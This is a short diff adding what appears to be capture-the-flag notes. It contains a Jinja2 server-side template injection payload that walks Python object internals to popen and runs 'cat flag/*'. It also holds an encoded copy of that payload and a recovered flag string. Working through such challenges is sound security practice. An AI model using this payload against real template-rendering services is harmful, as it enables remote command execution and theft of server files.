@@ -1,0 +1,9 @@
+Jinja2
+
+Ciphertext: {{()['_\x5fclass__']['_\x5fbase__']['_\x5fsubclasses__']()[58+1]['_\x5finit__']['_\x5fglobals__']['popen']('cat flag/*')['read']()}}
+=>
+Plaintext: LLWX,V0-Id74=2DD00V.,V0-Id732D600V.,V0-Id7DF34=2DD6D00V.WX,dgZ`.,V0-Id7:?:E00V.,V0-Id78=@32=D00V.,VA@A6?V.WV42E 7=28^YVX,VC625V.WXNN
+
+Ciphertext: LLWX,V0-Id74=2DD00V.,V0-Id732D600V.,V0-Id7DF34=2DD6D00V.WX,dgZ`.,V0-Id7:?:E00V.,V0-Id78=@32=D00V.,VA@A6?V.WV42E 7=28^YVX,VC625V.WXNN
+
+Plaintext: {FLG:Th3_S3cr3t_N0t3b00k_15_N0w_D3crypt3d!}
